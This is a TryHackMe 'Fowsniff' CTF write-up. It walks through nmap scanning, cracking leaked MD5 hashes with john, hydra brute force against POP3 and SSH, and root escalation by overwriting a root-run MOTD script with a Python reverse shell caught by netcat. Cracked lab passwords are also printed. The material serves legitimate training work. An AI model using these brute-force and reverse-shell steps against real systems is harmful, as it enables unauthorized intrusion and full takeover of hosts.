**THM** : Fowsniff CTF<br>
**Room Link** : https://tryhackme.com/room/ctf<br>
**Difficulty** : Easy <br>
**Key Topics, Techniques, and Tools** : <br>
 - Ports and Services scan : [nmap](https://nmap.org/)
 - Web content discovery : [gobuster](https://github.com/OJ/gobuster)
 - Password cracking : [john](https://www.openwall.com/john/doc/)
 - Bruteforce : [hydra](https://www.kali.org/tools/hydra/)
 - POP3/IMAP
 - Bash scripting 

<p align="center">   <img src="https://i.imgur.com/esbJEg8.png"> </p>  

# Summary

- [Summary](#summary)
  - [Adding IP to the hosts file](#adding-ip-to-the-hosts-file)
  - [Nmap scan](#nmap-scan)
  - [Web Content Discovery](#web-content-discovery)
  - [Password cracking](#password-cracking)
  - [POP3 bruteforce](#pop3-bruteforce)
  - [SSH Bruteforce](#ssh-bruteforce)
  - [Privilege escalation](#privilege-escalation)

<p align="center">   <img src="https://i.imgur.com/Kmtrf12.png"> </p> 

## Adding IP to the hosts file 
I start by adding the IP of the machine to my hosts file:<br>
```
echo "10.10.204.158 fowsniff.thm"|sudo tee -a /etc/hosts
```   

## Nmap scan

I perform an `Nmap` scan on the target host and save the output to a file called `nmapResults.txt` <br>
The scan includes all ports `-p-` and uses aggressive scan options `-A` <br>

```
└─# nmap fowsniff.thm -A -p- -oN nmapResults.txt            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 15:51 CEST
Nmap scan report for fowsniff.thm (10.10.204.158)
Host is up (0.033s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 903566f4c6d295121be8cddeaa4e0323 (RSA)
|   256 539d236734cf0ad55a9a1174bdfdde71 (ECDSA)
|_  256 a28fdbae9e3dc9e6a9ca03b1d71b6683 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE USER PIPELINING RESP-CODES TOP UIDL CAPA
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: capabilities listed IMAP4rev1 ENABLE LITERAL+ OK more have post-login ID Pre-login IDLE AUTH=PLAINA0001 SASL-IR LOGIN-REFERRALS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/29%OT=22%CT=1%CU=43142%PV=Y%DS=2%DC=T%G=Y%TM=644D210
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%TS=8)OPS(O1=M
OS:508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%
OS:O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%
OS:DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   30.70 ms 10.8.0.1
2   30.95 ms fowsniff.thm (10.10.204.158)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.74 seconds                                                            
```

There are 4 open ports :
- `SSH` - `OpenSSH 7.2p2` on port `22`
- `HTTP` - `Apache httpd 2.4.18` on port `80` 
- `POP3` - `Dovecot pop3d` on port `110` 
- `IMAP` - `Dovecot imapd` on port `143` <br>

Not having used the two POP3 and IMAP protocols, I did some research to learn more about them. These are two email protocols used to retrieve emails from a mail server. <br>
POP3 downloads emails to a device while IMAP provides direct access to emails stored on a mail server with synchronization between devices.

## Web Content Discovery
By visiting the website of the company Fowsniff Corp., we learn that it has been subject to a cyber attack and that information about employees may have been published on the internet.

<img src=https://i.imgur.com/Pd9ZgaX.png>
<br>
<br>
We also learn that the Twitter account @fowsniffcorp has been impacted. I decide to take a look at it to try to find some interesting information :

<img src=https://i.imgur.com/lFCWuA1.png>

A Pastebin link was tweeted by the attackers, but it is unavailable. So, I use the Wayback Machine to find the information contained in this link :
<img src=https://i.imgur.com/dLDtzyQ.png>

The file contains a list of company users with the MD5 hash of their passwords. The company's website indicated that employees were invited to change their passwords following the attack, but I will still try to crack these passwords.

## Password cracking
I use `john` to crack the list of hashes that I placed in the `credentials.txt` file (using the wordlist `rockyou.txt`) : 

```
└─# john credentials.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
Using default input encoding: UTF-8
Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
scoobydoo2       (seina@fowsniff)     
orlando12        (parede@fowsniff)     
apples01         (tegel@fowsniff)     
skyler22         (baksteen@fowsniff)     
mailcall         (mauer@fowsniff)     
07011972         (sciana@fowsniff)     
carp4ever        (mursten@fowsniff)     
bilbo101         (mustikka@fowsniff)  
```
I retrieve all the users' passwords. I will now see if they have been changed, by trying to brute force the `POP3 login`.

## POP3 bruteforce
I use `hydra` to try to brute force the `POP3 login` with the list of credentials I obtained :

```
└─# hydra -C credentialsEnClair.txt fowsniff.thm pop3
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-29 17:26:18
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries, ~1 try per task
[DATA] attacking pop3://fowsniff.thm:110/
[110][pop3] host: fowsniff.thm   login: seina   password: scoobydoo2
1 of 1 target completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-29 17:26:21
```
The user `seina` has not changed their password. I found a documentation with basic `POP3` commands and how to connect. So, I connect with their credentials on `POP3` using telnet to see if I can find any interesting emails : 

```
└─# telnet fowsniff.thm 110
Trying 10.10.204.158...
Connected to fowsniff.thm.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```
The mailbox contains 2 emails, one of which contains a temporary password for SSH. The sender of the email asks users to change this temporary password as soon as possible, but I will still try to bruteforce the SSH service with the list of users that I have gathered and the password. 

## SSH Bruteforce
I placed all the usernames in the `usernamesSSH.txt` file and used `hydra` to test these usernames with the temporary password in `SSH` : 
```
└─# hydra -L usernamesSSH.txt -p 'S1ck3nBluff+secureshell' fowsniff.thm ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-29 17:52:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task
[DATA] attacking ssh://fowsniff.thm:22/
[22][ssh] host: fowsniff.thm   login: baksteen   password: S1ck3nBluff+secureshell
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-29 17:52:15
```
The user `baksteen` has not changed the temporary password, so I can connect in SSH with these credentials :
```
└─# ssh baksteen@fowsniff.thm       
The authenticity of host 'fowsniff.thm (10.10.204.158)' can't be established.
ED25519 key fingerprint is SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:10: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'fowsniff.thm' (ED25519) to the list of known hosts.
baksteen@fowsniff.thm's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ 
```
So I am SSH connected to the machine.

## Privilege escalation
As always, on a linux machine, I run the command `sudo -l`. A password is asked which indicates the user does not have sudo permission on the machine :
``` 
baksteen@fowsniff:~$ sudo -l
[sudo] password for baksteen: 
```
Running the `groups` command I notice that the user `baksteen` is part of the `users` group ; so I run the command `find / -group users -type f -executable 2>/dev/null` which will search for all the files belonging to the "users" group and having the execution permission :
```
baksteen@fowsniff:~$ groups
users baksteen  
baksteen@fowsniff:~$ find / -group users -type f -executable 2>/dev/null                                                                      
/opt/cube/cube.sh 
```
The file `/opt/cube/cube.sh` is returned. When I run the script, I realize that it returns a banner similar to the one displayed when we connect in SSH : 
```
baksteen@fowsniff:~$ /opt/cube/cube.sh                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
                            _____                       _  __  __                                                                                                                                                                           
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|                                                                                                                                                                          
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_                                                                                                                                                                           
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|                                                                                                                                                                          
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|                                                                                                                                                                            
-:      y.      dssssssso                ____                                                                                                                                                                                               
-:      y.      dssssssso               / ___|___  _ __ _ __                                                                                                                                                                                
-:      y.      dssssssso              | |   / _ \| '__| '_ \                                                                                                                                                                               
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _                                                                                                                                                                           
-:      o.      yssssssso               \____\___/|_|  | .__/  (_)                                                                                                                                                                          
-:    .+mdddddddmyyyyyhy:                              |_|                                                                                                                                                                                  
-: -odMMMMMMMMMMmhhdy/.                                                                                                                                                                                                                     
.ohdddddddddddddho:                  Delivering Solutions
```
So I check the `/etc/update-motd.d/00-header` file (shell script used to generate the dynamic greeting). It shows that the file `/opt/cube/cube.sh` is executed (as root) when a user connects to the machine using `SSH` :
```
baksteen@fowsniff:~$ cat /etc/update-motd.d/00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#       # Fall back to using the very slow lsb_release utility
#       DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```
It could be interesting to modify this script. First, I check if the user `baksteen` has write permission on the file. Then, I modify the `/opt/cube/cube.sh` file in order to insert a `python` reverse shell to my machine on the `9494` port :
```
baksteen@fowsniff:~$ ls -la /opt/cube/cube.sh
-rw-rwxr-- 1 parede users 851 Mar 11  2018 /opt/cube/cube.sh
baksteen@fowsniff:~$ echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.75.8\",9494));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > /opt/cube/cube.sh
```

I run a netcat listener on port `9494` :
```
└─# nc -lvnp 9494  
listening on [any] 9494 ...
```

I disconnect and reconnect in SSH and I receive a root shell on the listening port `9494` :
```
└─# nc -lvnp 9494
listening on [any] 9494 ...
connect to [10.8.75.8] from (UNKNOWN) [10.10.221.146] 38652
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# 
```

So I am root of the machine and I can finally get the flag contained in the `/root` directory :

```
# cd /root   
# ls -la
total 28
drwx------  4 root root 4096 Mar  9  2018 .
drwxr-xr-x 22 root root 4096 Mar  9  2018 ..
-rw-r--r--  1 root root 3117 Mar  9  2018 .bashrc
drwxr-xr-x  2 root root 4096 Mar  9  2018 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  5 root root 4096 Mar  9  2018 Maildir
-rw-r--r--  1 root root  582 Mar  9  2018 flag.txt
# cat flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```